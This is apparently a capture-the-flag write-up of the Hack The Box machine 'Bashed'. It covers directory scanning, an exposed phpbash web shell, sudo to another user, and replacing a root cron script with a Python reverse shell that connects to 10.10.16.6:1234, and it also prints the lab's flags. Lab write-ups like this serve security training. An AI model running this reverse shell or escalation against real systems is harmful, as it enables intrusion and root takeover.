# HTB Bashed

Basic Nmap Scan:
![[./_resources/HTB_Bashed.resources/image.png]]
Aggressive Nmap Scan:
![[./_resources/HTB_Bashed.resources/image.1.png]]

Feroxbuster findings with raft-small-files:
```
🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      117l      685w    4689c http://10.10.10.68/css/sm-clean.css
200      GET      154l      394w    7477c http://10.10.10.68/single.html
200      GET      161l      397w    7743c http://10.10.10.68/index.html
200      GET      680l    1154w    10723c http://10.10.10.68/css/common.css
200      GET        3l      206w    24476c http://10.10.10.68/js/jquery.smartmenus.min.js
200      GET      195l      678w    10863c http://10.10.10.68/scroll.html
200      GET      38l      76w      909c http://10.10.10.68/js/custom_google_map_style.js
403      GET      11l      32w      295c http://10.10.10.68/.htaccess
200      GET        8l      35w    1404c http://10.10.10.68/images/logo.png
200      GET      156l      456w    7805c http://10.10.10.68/contact.html
200      GET        4l      66w    29063c http://10.10.10.68/css/font-awesome.min.css
200      GET      154l      547w    8193c http://10.10.10.68/about.html
200      GET        6l      20w      875c http://10.10.10.68/images/arrow.png
200      GET    1412l    2291w    24164c http://10.10.10.68/style.css
200      GET      118l      550w    60153c http://10.10.10.68/js/jquery.nicescroll.min.js
200      GET      893l    3885w    26643c http://10.10.10.68/js/imagesloaded.pkgd.js
200      GET      58l      254w    1783c http://10.10.10.68/js/jquery.easing.1.3.js
200      GET      262l      560w    8904c http://10.10.10.68/js/main.js
200      GET        6l    1435w    97184c http://10.10.10.68/js/jquery.js
200      GET      12l      63w    1392c http://10.10.10.68/js/jquery.mousewheel.min.js
200      GET        7l      23w      761c http://10.10.10.68/images/favicon.png
200      GET      13l      113w    4313c http://10.10.10.68/js/jquery.touchSwipe.min.js
200      GET        8l      73w    2429c http://10.10.10.68/js/html5.js
200      GET      15l      672w    36079c http://10.10.10.68/js/jquery.carouFredSel-6.0.0-packed.js
200      GET      96l      166w    1661c http://10.10.10.68/css/clear.css
200      GET      154l    1009w    41247c http://10.10.10.68/images/ajax-document-loader.gif
200      GET      32l      116w    1222c http://10.10.10.68/css/carouFredSel.css
200      GET      161l      397w    7743c http://10.10.10.68/
200      GET      14l      175w    7256c http://10.10.10.68/demo-images/profile_01.jpg
200      GET      10l      31w    25937c http://10.10.10.68/demo-images/01.jpg
200      GET      16l      43w    9327c http://10.10.10.68/demo-images/01_blogpost_galery.jpg
200      GET      481l    2207w  120570c http://10.10.10.68/demo-images/bash1.png
403      GET      11l      32w      291c http://10.10.10.68/.html
200      GET    2412l    19172w  1048508c http://10.10.10.68/demo-images/bg.jpg
200      GET        6l      28w    5124c http://10.10.10.68/demo-images/one_drop_post_image02.jpg
200      GET      18l      480w    12037c http://10.10.10.68/demo-images/02.jpg
200      GET        8l      46w    9077c http://10.10.10.68/demo-images/03_blogpost_galery.jpg
200      GET      17l      472w    10554c http://10.10.10.68/demo-images/03.jpg
200      GET      10l      57w    8792c http://10.10.10.68/demo-images/02_blogpost_galery.jpg
200      GET        8l      32w    19742c http://10.10.10.68/demo-images/featured-image.jpg
403      GET      11l      32w      290c http://10.10.10.68/.php
200      GET      122l      258w    25459c http://10.10.10.68/demo-images/bash2.png
200      GET        0l        0w        0c http://10.10.10.68/config.php
403      GET      11l      32w      295c http://10.10.10.68/.htpasswd
403      GET      11l      32w      290c http://10.10.10.68/.htm
403      GET      11l      32w      296c http://10.10.10.68/.htpasswds
403      GET      11l      32w      294c http://10.10.10.68/.htgroup
403      GET      11l      32w      299c http://10.10.10.68/wp-forum.phps
403      GET      11l      32w      299c http://10.10.10.68/.htaccess.bak
403      GET      11l      32w      293c http://10.10.10.68/.htuser
[####################] - 12s    11492/11492  0s      found:50      errors:0     
[####################] - 12s    11425/11425  925/s  http://10.10.10.68/
[####################] - 0s    11425/11425  0/s    http://10.10.10.68/js/ => Directory listing
[####################] - 5s    11425/11425  0/s    http://10.10.10.68/images/ => Directory listing
[####################] - 0s    11425/11425  0/s    http://10.10.10.68/css/ => Directory listing
[####################] - 1s    11425/11425  0/s    http://10.10.10.68/demo-images/ => Directory listing
```
Feroxbuster output with small-directories.:
```
🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      262l      560w    8904c http://10.10.10.68/js/main.js
200      GET      680l    1154w    10723c http://10.10.10.68/css/common.css
301      GET        9l      28w      308c http://10.10.10.68/dev => http://10.10.10.68/dev/
200      GET        4l      66w    29063c http://10.10.10.68/css/font-awesome.min.css
301      GET        9l      28w      308c http://10.10.10.68/php => http://10.10.10.68/php/
200      GET      216l      489w        0c http://10.10.10.68/dev/phpbash.php
200      GET        1l      255w    4559c http://10.10.10.68/dev/phpbash.min.php
200      GET        0l        0w        0c http://10.10.10.68/php/sendMail.php
200      GET      154l    1009w    41247c http://10.10.10.68/images/ajax-document-loader.gif
200      GET        7l      23w      761c http://10.10.10.68/images/favicon.png
200      GET        6l      20w      875c http://10.10.10.68/images/arrow.png
200      GET        8l      35w    1404c http://10.10.10.68/images/logo.png
301      GET        9l      28w      307c http://10.10.10.68/js => http://10.10.10.68/js/
200      GET      15l      672w    36079c http://10.10.10.68/js/jquery.carouFredSel-6.0.0-packed.js
200      GET      118l      550w    60153c http://10.10.10.68/js/jquery.nicescroll.min.js
200      GET      38l      76w      909c http://10.10.10.68/js/custom_google_map_style.js
200      GET      12l      63w    1392c http://10.10.10.68/js/jquery.mousewheel.min.js
200      GET        6l    1435w    97184c http://10.10.10.68/js/jquery.js
200      GET        3l      206w    24476c http://10.10.10.68/js/jquery.smartmenus.min.js
200      GET      58l      254w    1783c http://10.10.10.68/js/jquery.easing.1.3.js
200      GET      13l      113w    4313c http://10.10.10.68/js/jquery.touchSwipe.min.js
301      GET        9l      28w      310c http://10.10.10.68/fonts => http://10.10.10.68/fonts/
200      GET      893l    3885w    26643c http://10.10.10.68/js/imagesloaded.pkgd.js
200      GET        8l      73w    2429c http://10.10.10.68/js/html5.js
200      GET    2588l    4636w  124988c http://10.10.10.68/fonts/FontAwesome.otf
200      GET      685l    57230w  391622c http://10.10.10.68/fonts/fontawesome-webfont.svg
301      GET        9l      28w      311c http://10.10.10.68/images => http://10.10.10.68/images/
200      GET    1304l    5478w  152796c http://10.10.10.68/fonts/fontawesome-webfont.ttf
200      GET      390l    2094w    76518c http://10.10.10.68/fonts/fontawesome-webfont.eot
200      GET      310l    2069w    90412c http://10.10.10.68/fonts/fontawesome-webfont.woff
200      GET      260l    1635w    71896c http://10.10.10.68/fonts/fontawesome-webfont.woff2
301      GET        9l      28w      308c http://10.10.10.68/css => http://10.10.10.68/css/
200      GET      96l      166w    1661c http://10.10.10.68/css/clear.css
200      GET      117l      685w    4689c http://10.10.10.68/css/sm-clean.css
200      GET      32l      116w    1222c http://10.10.10.68/css/carouFredSel.css
301      GET        9l      28w      312c http://10.10.10.68/uploads => http://10.10.10.68/uploads/
200      GET    1412l    2291w    24164c http://10.10.10.68/style.css
200      GET      161l      397w    7743c http://10.10.10.68/index.html
200      GET      154l      394w    7477c http://10.10.10.68/single.html
200      GET      161l      397w    7743c http://10.10.10.68/
403      GET      11l      32w      299c http://10.10.10.68/server-status
[####################] - 30s    40296/40296  0s      found:41      errors:18   
[####################] - 29s    20116/20116  685/s  http://10.10.10.68/
[####################] - 0s    20116/20116  0/s    http://10.10.10.68/dev/ => Directory listing
[####################] - 0s    20116/20116  0/s    http://10.10.10.68/php/ => Directory listing
[####################] - 0s    20116/20116  0/s    http://10.10.10.68/images/ => Directory listing
[####################] - 1s    20116/20116  0/s    http://10.10.10.68/js/ => Directory listing
[####################] - 1s    20116/20116  0/s    http://10.10.10.68/fonts/ => Directory listing
[####################] - 0s    20116/20116  0/s    http://10.10.10.68/css/ => Directory listing
[####################] - 22s    20116/20116  882/s  http://10.10.10.68/uploads/
```
In accessing the directory : **http://10.10.10.68/dev/phpbash.min.php** I was able to just simply access the machine via a dumb shell and get the first user flag in Arrexel's home directory.
flag:
```
7e4c3830c599b84a48fa940e58a8c03b
```

Next, I found via [Linpeas.sh](http://Linpeas.sh), that I can execute commands as scriptmanager. I previously verified this as well with the sudo -l command. I can use the following to open a bash session as this user.:
```
sudo -u scriptmanager /bin/bash
```
From here, I was able to access the scripts directory in the root directory which had the following files.:
![[./_resources/HTB_Bashed.resources/image.2.png]]
When inspecting these files, I can quickly realize that the [test.py](http://test.py) file is able to execute as root. This python file created the test.txt file we see here. I can modify this python script to do anything as root.

I used a reverse shell from pentestmonkey to accomplish this. it is vital to note that there was a cronjob listed to execute the [test.py](http://test.py) script every minute as root. If I were to execute it myself, this obviously would not work. This require a bit of a wait time so that it can be executed automacatically when I have an open netcat listener.
python reverse shell:
```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.6",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

I got root access and found the root.txt file.:
```
7ac0ce3a97394d43e618e91c50c729c9
```

**###ROOTED!!!###**
